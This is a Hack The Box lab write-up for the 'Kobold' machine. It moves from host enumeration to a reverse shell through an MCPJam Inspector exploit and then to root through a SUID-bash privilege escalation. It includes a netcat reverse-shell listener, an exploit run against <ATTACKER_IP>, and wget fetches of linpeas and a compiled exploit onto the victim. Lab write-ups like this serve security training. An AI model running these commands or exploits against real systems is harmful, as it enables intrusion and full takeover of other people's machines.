---
title: "HTB: Kobold"
description: "Hack The Box - Kobold Writeup"
tags: [htb, starting-point, mcpjam, cve-2026-23744, cve-2026-41651, linux, easy]
---

# Hack The Box: Kobold

**Difficulty:** Easy  
**OS:** Linux  
**Category:** Hack The Box  
**Primary Vectors:** Virtual host enumeration, MCPJam RCE, local privilege escalation

---

## Overview

Kobold starts with a small web-facing attack surface: SSH, HTTP, HTTPS, and an unknown service on port `3552/tcp`. The HTTP service redirects to `kobold.htb`, and virtual host enumeration reveals two additional subdomains: `mcp.kobold.htb` and `bin.kobold.htb`.

The foothold comes from an exposed MCPJam Inspector instance running version `v1.4.2`, which is vulnerable to CVE-2026-23744. After gaining a reverse shell as a low-privileged user, local enumeration points to a Pack2TheRoot privilege escalation issue, CVE-2026-41651, which can be used to obtain a root shell and read the final flag.

---

## Submit User Flag

### Step 1: Port Scanning

I started with RustScan to quickly identify open TCP ports and hand those results to Nmap:

```bash
sudo rustscan -a 10.129.245.50
```

```text
Open 10.129.245.50:22
Open 10.129.245.50:80
Open 10.129.245.50:443
Open 10.129.245.50:3552

PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
80/tcp   open  http     syn-ack ttl 63
443/tcp  open  https    syn-ack ttl 63
3552/tcp open  taserver syn-ack ttl 63
```

The initial scan gives us four ports to investigate:

- `22/tcp` - SSH
- `80/tcp` - HTTP
- `443/tcp` - HTTPS
- `3552/tcp` - unknown service identified by Nmap as `taserver`

### Step 2: Web Enumeration

Next, I used WhatWeb to fingerprint the web service:

```bash
whatweb -a 3 http://10.129.245.50
```

```text
http://10.129.245.50 [301 Moved Permanently] RedirectLocation[https://kobold.htb/]
https://kobold.htb/ [200 OK] Email[admin@kobold.htb], Title[Kobold Operations Suite], nginx[1.24.0]
```

The redirect tells us to add the hostname to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.245.50 kobold.htb" >> /etc/hosts'
```

Directory brute forcing against the main host did not return anything useful:

```bash
feroxbuster -u http://kobold.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```text
[####################] - 62s   220546/220546  3567/s  http://kobold.htb/
found:0
```

When content discovery is quiet, virtual host enumeration is a good next step.

### Step 3: Virtual Host Enumeration

I used `ffuf` to fuzz the `Host` header and filtered out the default response size:

```bash
ffuf -u https://kobold.htb \
  -H "Host: FUZZ.kobold.htb" \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -fs 154
```

```text
mcp                     [Status: 200, Size: 466, Words: 57, Lines: 15]
bin                     [Status: 200, Size: 24402, Words: 1218, Lines: 386]
```

Add the discovered virtual hosts to `/etc/hosts`:

```bash
sudo sh -c 'echo "10.129.245.50 mcp.kobold.htb bin.kobold.htb" >> /etc/hosts'
```

The interesting target is `mcp.kobold.htb`, which exposes MCPJam Inspector.

### Step 4: MCPJam RCE

The MCPJam instance reports the following version:

```text
MCPJam Version: v1.4.2
```

This version is vulnerable to CVE-2026-23744. A public proof of concept is available here:

```text
https://github.com/SrGinebras/CVE-2026-23744-RCE-for-MCPjam-inspector-v1.4.2
```

Install the Python dependency required by the PoC:

```bash
pip3 install requests
```

Start a listener:

```bash
nc -lvnp 443
```

Then run the exploit from a second terminal:

```bash
python3 CVE-2026-23744.py -u https://mcp.kobold.htb -i <ATTACKER_IP> -p 443
```

Once the exploit lands, we get a reverse shell on the target. From there, move into Ben's home directory and read the user flag:

```bash
cd /home/ben
cat user.txt
```

---

## Submit Root Flag

### Step 1: Local Enumeration

After getting a shell, I transferred and ran `linpeas.sh` to look for common Linux privilege escalation paths:

```bash
wget http://<ATTACKER_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

One notable finding is a Pack2TheRoot privilege escalation path. The public PoC is available here:

```text
https://github.com/Lutfifakee-Project/CVE-2026-41651
```

### Step 2: Compile the Exploit

On the attacker machine, install the required development package and compile the exploit:

```bash
sudo apt install libglib2.0-dev
gcc -o exploit CVE-2026-41651.c \
  `pkg-config --cflags --libs glib-2.0 gio-2.0` \
  -Wall
```

Host the compiled exploit:

```bash
python3 -m http.server 80
```

Download it from the victim machine:

```bash
wget http://<ATTACKER_IP>/exploit
chmod +x exploit
```

### Step 3: Exploit and Preserve Root Access

Run the exploit on the victim:

```bash
./exploit
```

The exploit creates a SUID Bash binary in `/tmp`. Find it and run it with preserved privileges:

```bash
find /tmp -perm -4000 -name "*bash*" 2>/dev/null
/tmp/.suid_bash -p
```

The `-p` flag tells Bash to preserve the effective UID, giving us a root shell. From there, read the root flag:

```bash
cd /root
cat root.txt
```

---

## Summary & Key Takeaways

- **Follow redirects carefully:** The initial HTTP service redirects to `kobold.htb`, which gives us the first hostname to map locally.
- **Use virtual host enumeration when directories are quiet:** `feroxbuster` did not find useful paths, but `ffuf` found `mcp.kobold.htb` and `bin.kobold.htb`.
- **Fingerprint exposed tooling:** MCPJam Inspector exposed its version, which led directly to CVE-2026-23744.
- **Do not skip local enumeration:** `linpeas.sh` highlighted the privilege escalation path that led to root.
- **Preserve privileges correctly:** When abusing a SUID Bash binary, use `bash -p` so the shell keeps the elevated effective UID.
